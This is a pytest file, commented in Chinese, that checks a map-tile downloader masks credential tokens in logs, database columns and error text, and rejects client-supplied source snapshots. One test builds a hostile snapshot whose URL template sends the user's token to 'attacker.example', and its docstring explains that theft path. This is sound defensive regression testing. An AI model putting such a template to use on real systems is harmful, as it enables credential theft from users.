"""S1 / S2：凭据真值不许进日志、数据库、HTTP 响应，快照合同不许客户端签。

两条都是最终全分支评审的 high。每条用例在修复之前都跑红过；断言的是可观察
后果（DB 里那一列的内容、任务行里存了什么），不是实现细节。
"""

import asyncio
import json
import time

import aiohttp
import pytest
from yarl import URL

from src.plugins import registry

#: 一个绝不能出现在任何日志 / DB 列 / HTTP 响应里的 token 真值。
TOKEN = 'SECRET_TOKEN_XYZ'
TOKEN_URL = (f'https://t0.tianditu.gov.cn/img_w/wmts?SERVICE=WMTS'
             f'&TILEMATRIX=5&TILEROW=2&TILECOL=2&tk={TOKEN}')


@pytest.fixture
def db(tmp_path, monkeypatch):
    """一张真库。写法照 tests/test_plugin_task_manager.py:111-130。"""
    from src.core import config as config_mod

    path = tmp_path / 'data' / 'map_downloader.db'
    path.parent.mkdir(parents=True)
    monkeypatch.setattr(config_mod.Config, 'DATABASE_PATH', path)
    monkeypatch.setattr(config_mod.Config, 'BASE_DIR', tmp_path)
    monkeypatch.setattr(config_mod.Config, 'DOWNLOADS_DIR', tmp_path / 'downloads')
    monkeypatch.setattr(config_mod.Config, 'CACHE_DIR', tmp_path / 'cache')

    from src.core.database import init_database

    init_database()
    return path


def _write_plugin(tmp_path, monkeypatch, pid, body, *,
                  caps='["pipeline"]', perms='["network"]', enable=True):
    """在 tmp_path/plugins/<pid> 下放一个外部插件并重扫注册表。"""
    monkeypatch.setattr(registry, '_plugins_root', lambda: tmp_path / 'plugins')
    d = tmp_path / 'plugins' / pid
    d.mkdir(parents=True)
    (d / 'plugin.toml').write_text(
        f'id="{pid}"\nname="{pid}"\nversion="0.1"\napi_version="1"\n'
        f'capabilities={caps}\npermissions={perms}\n', encoding='utf-8')
    (d / 'plugin.py').write_text(body, encoding='utf-8')
    registry.reset_for_tests()
    registry.load_all()
    if enable:
        registry.set_enabled(pid, True)
    return d


def _wait_status(mgr, tid, want, timeout=15.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        row = mgr.get_task(tid)
        if row and row['status'] in want:
            return row
        time.sleep(0.05)
    return mgr.get_task(tid)


# ---------------------------------------------------------------- S1 脱敏

def test_mask_hides_query_credentials_and_keeps_the_host():
    """脱敏掩值不掩主机：排查要看得见去了哪台机器，但不能看见 token。"""
    from src.services.system_proxy import mask_url_secrets

    masked = mask_url_secrets(TOKEN_URL)
    assert TOKEN not in masked
    assert 't0.tianditu.gov.cn' in masked and 'TILEROW=2' in masked
    assert 'tk=***' in masked
    # userinfo 那一半仍然生效（这个函数是 mask_url_userinfo 扩出来的）。
    assert mask_url_secrets('http://u:p@h:7890/') == 'http://***:***@h:7890/'
    # 没有任何东西要掩时原样返回 —— 日志里的 URL 与真正发出去的那条一致。
    assert mask_url_secrets('https://h/a?b=1') == 'https://h/a?b=1'


def test_mask_covers_a_url_embedded_in_an_exception_repr():
    """异常里的 URL 不是整串，是嵌在中间的一段——必须按文本扫。

    `aiohttp.ClientResponseError` 的 str() 与 repr() **都**带完整请求 URL，
    这正是 token 过期返回 403 时泄漏的那条路径（不需要攻击者）。
    """
    from src.services.system_proxy import mask_text_secrets

    exc = aiohttp.ClientResponseError(
        request_info=aiohttp.RequestInfo(
            url=URL(TOKEN_URL), method='GET',
            headers=aiohttp.typedefs.CIMultiDict(), real_url=URL(TOKEN_URL)),
        history=(), status=403, message='Forbidden')
    assert TOKEN in repr(exc) and TOKEN in str(exc), '前提：异常本身确实带 token'
    assert TOKEN not in mask_text_secrets(repr(exc))
    assert TOKEN not in mask_text_secrets(str(exc))
    assert '403' in mask_text_secrets(str(exc)), '状态码是排查线索，不该被抹掉'


def test_token_never_reaches_task_tiles_error_message(db, tmp_path, monkeypatch):
    """端到端：带 token 的 URL 走完下载异常路径后，`task_tiles.error_message`
    里找不到 token 真值。

    两段真代码接在生产用的同一个缝上：`DownloadEngine._download_single_tile`
    产出 `error_msg`（异常分支），`TaskManager._write_progress_batch` 把它写进
    `task_tiles`（`pending_tile_inserts` 的元组形制）。
    """
    from src.core.database import get_connection
    from src.models.task import Tile
    from src.services.download_engine import DownloadEngine
    from src.services.task_manager import TaskManager

    engine = DownloadEngine()
    tile = Tile(task_id=1, zoom=5, x=2, y=2)

    class _FailingSession:
        def get(self, url, **kwargs):
            raise aiohttp.ClientResponseError(
                request_info=aiohttp.RequestInfo(
                    url=URL(TOKEN_URL), method='GET',
                    headers=aiohttp.typedefs.CIMultiDict(),
                    real_url=URL(TOKEN_URL)),
                history=(), status=403, message='Forbidden')

    monkeypatch.setattr(engine, 'get_tile_url',
                        lambda *a, **k: TOKEN_URL)
    monkeypatch.setattr(engine, '_get_cache_path',
                        lambda *a, **k: tmp_path / 'nope.png')
    result = asyncio.run(engine._download_single_tile(
        tile, 's', _FailingSession(), str(tmp_path / 'out')))
    error = result['error']
    assert TOKEN not in error, error
    assert 'ClientResponseError' in error, '类型仍要看得见'

    conn = get_connection()
    try:
        conn.execute(
            "INSERT INTO tasks (id, name, north, south, east, west,"
            " zoom_min, zoom_max, style, output_format, output_path, status)"
            " VALUES (1, 't', 1, 0, 1, 0, 5, 5, 's', 'png', ?, 'failed')",
            (str(tmp_path / 'out'),))
        conn.commit()
    finally:
        conn.close()

    mgr = TaskManager.__new__(TaskManager)
    mgr._deleting = set()
    conn = get_connection()
    try:
        mgr._write_progress_batch(
            conn, 1,
            ([(1, tile.zoom, tile.x, tile.y, result['status'], error)],
             [], [], 0, 1))
        stored = conn.execute(
            'SELECT error_message FROM task_tiles WHERE task_id = 1'
        ).fetchone()['error_message']
    finally:
        conn.close()
    assert TOKEN not in stored, stored


_LEAKY_PLUGIN = '''
from src.contracts.outcome import TileOutcome
from src.plugins.protocols import ParamSchema, PluginDefinition, PluginOutcome


class P:
    def params_schema(self): return ParamSchema(())
    def estimate(self, params, region): return None

    def run(self, ctx):
        ctx.record_tile_outcome(
            5, 2, 2, TileOutcome.PERMANENT_FAILURE,
            "ClientResponseError: 403, url=URL('%s')")
        return PluginOutcome.COMPLETED_WITH_GAPS


def register(): return PluginDefinition(pipeline=P())
''' % TOKEN_URL


def test_plugin_supplied_tile_error_is_masked_before_it_lands(
        db, tmp_path, monkeypatch):
    """插件写回来的缺块错误文本同样过脱敏——它会被 `/gaps` 的 samples 原样吐出。"""
    from src.core.database import get_connection
    from src.plugins.task_manager import PluginTaskManager

    _write_plugin(tmp_path, monkeypatch, 'leaky', _LEAKY_PLUGIN)
    mgr = PluginTaskManager(socketio=None)
    tid = mgr.create_task('leaky', {'name': 'leak',
                                    'bbox': [40.0, 30.0, 117.0, 116.0],
                                    'output_path': str(tmp_path / 'out')})
    mgr.start_task(tid)
    _wait_status(mgr, tid, ('completed_with_gaps', 'completed', 'failed'))

    conn = get_connection()
    try:
        stored = conn.execute(
            'SELECT error_message FROM plugin_task_tiles WHERE task_id = ?',
            (tid,)).fetchone()['error_message']
    finally:
        conn.close()
    assert TOKEN not in stored, stored
    assert '403' in stored
    registry.reset_for_tests()


# ---------------------------------------------------------------- S2 快照

def test_client_supplied_source_snapshot_is_rejected(isolated_app, tmp_path):
    """建任务请求自带的 `source_snapshot` 一律丢弃。

    不丢的话：一个**不带** `source_plugin_id` 的请求就能自带一张
    url_template 指向攻击者主机、credential_reference 指向
    `plugin:tianditu:token` 的快照，宿主会拿着用户的真 token 逐块瓦片去请求
    那台服务器（`{credential}` 的替换只看快照怎么写）。
    """
    from src.core.database import get_connection

    client = isolated_app.app.test_client()
    evil = {
        'source_id': 'plugin:tianditu:img',
        'url_template': 'http://attacker.example/steal?t={credential}',
        'style': 'p',
        'credential_reference': 'plugin:tianditu:token',
    }
    resp = client.post('/api/tasks', json={
        'name': 'exfil', 'north': 1.0, 'south': 0.0, 'east': 1.0, 'west': 0.0,
        'zoom_min': 5, 'zoom_max': 5, 'style': 'satellite',
        'output_format': 'png', 'output_path': str(tmp_path / 'out'),
        'source_snapshot': json.dumps(evil),
    })
    assert resp.status_code == 201, resp.get_data(as_text=True)
    tid = resp.get_json()['task_id']

    conn = get_connection()
    try:
        row = conn.execute('SELECT source_snapshot FROM tasks WHERE id = ?',
                           (tid,)).fetchone()
    finally:
        conn.close()
    stored = (row['source_snapshot'] or '') if row is not None else ''
    assert 'attacker.example' not in stored, stored


# ------------------------------------------- 定向复审：写入端 / 逗号截断

_THROWING_PLUGIN = """
from src.plugins.protocols import ParamSchema, PluginDefinition


class P:
    def params_schema(self): return ParamSchema(())
    def estimate(self, params, region): return None

    def run(self, ctx):
        raise RuntimeError('TileJSON fail: %s')


def register(): return PluginDefinition(pipeline=P())
""" % TOKEN_URL


def test_token_never_reaches_plugin_tasks_error_message(db, tmp_path, monkeypatch):
    """**写入端**：插件抛的异常经 `_finish` 落 `plugin_tasks.error_message`
    时就该已经掩过。

    只在 `_emit`（广播端）掩是不够的：这一列被
    `plugins_api._TASK_PUBLIC_COLUMNS` 与统一任务列表的 UNION 原样吐给浏览器，
    也会进诊断包与备份 —— 存进去那一刻就已经泄漏了。首日就会撞上：
    `mvt_pipeline` 把用户填的 `tilejson_url` 逐字嵌进 RuntimeError，而
    Mapbox 的 TileJSON 地址长这样 `…?access_token=pk…`。
    """
    from src.core.database import get_connection
    from src.plugins.task_manager import PluginTaskManager

    _write_plugin(tmp_path, monkeypatch, 'thrower', _THROWING_PLUGIN)
    mgr = PluginTaskManager(socketio=None)
    tid = mgr.create_task('thrower', {'name': 'x',
                                      'bbox': [40.0, 30.0, 117.0, 116.0],
                                      'output_path': str(tmp_path / 'out')})
    mgr.start_task(tid)
    row = _wait_status(mgr, tid, ('failed',))
    assert row['status'] == 'failed'

    conn = get_connection()
    try:
        stored = conn.execute(
            'SELECT error_message FROM plugin_tasks WHERE id = ?',
            (tid,)).fetchone()['error_message']
    finally:
        conn.close()
    assert TOKEN not in stored, stored
    assert 'TileJSON fail' in stored, '真原因仍要看得见'
    registry.reset_for_tests()


def test_mask_survives_a_comma_inside_the_query_string():
    """带 bbox 的 WMS/ArcGIS URL：逗号在查询串中段，不许把匹配截断。

    这条正则从 `task_logging` 搬过来时职责变了：旧口径只掩 netloc 里的
    `user:pass@`（永远排在查询串之前，逗号截断无害），新口径要掩查询串**尾部**
    的参数值，在第一个逗号处截断就等于完全不脱敏。
    """
    from src.services.system_proxy import mask_text_secrets

    text = f'err: https://h/wms?bbox=1,2,3,4&tk={TOKEN} -> 403'
    masked = mask_text_secrets(text)
    assert TOKEN not in masked, masked
    assert 'bbox=1,2,3,4' in masked, '中段的逗号不许动'
    assert '-> 403' in masked


def test_mask_gives_back_trailing_sentence_punctuation():
    """散文里的句读不该被吃掉：URL 末尾的逗号/句号剥回去再拼上。"""
    from src.services.system_proxy import mask_text_secrets

    masked = mask_text_secrets(f'see https://h/a?tk={TOKEN}, then stop')
    assert masked == 'see https://h/a?tk=***, then stop'


def test_uncaught_plugin_exception_does_not_dump_a_raw_traceback_to_app_log(
        db, tmp_path, monkeypatch, caplog):
    """app 日志没挂脱敏 filter，所以这条路径不许写 `logger.exception`。"""
    import logging

    from src.plugins.task_manager import PluginTaskManager

    _write_plugin(tmp_path, monkeypatch, 'thrower2', _THROWING_PLUGIN)
    mgr = PluginTaskManager(socketio=None)
    tid = mgr.create_task('thrower2', {'name': 'x',
                                       'bbox': [40.0, 30.0, 117.0, 116.0],
                                       'output_path': str(tmp_path / 'out')})
    with caplog.at_level(logging.DEBUG, logger='src.plugins.task_manager'):
        mgr.start_task(tid)
        _wait_status(mgr, tid, ('failed',))

    # 只看 app 日志那条 logger。tlog（`task.plugin.<id>`）是另一回事：它的
    # 读取端（详情页、诊断包导出）过 `task_logging.redact`，那条既有口径不在
    # 本轮范围内。
    app_records = [r for r in caplog.records
                   if r.name == 'src.plugins.task_manager']
    assert app_records, '这条路径本来就该在 app 日志里留一句摘要'
    for rec in app_records:
        assert TOKEN not in rec.getMessage(), rec.getMessage()
        assert rec.exc_info is None, '完整 traceback 不该进未脱敏的 app 日志'
    registry.reset_for_tests()
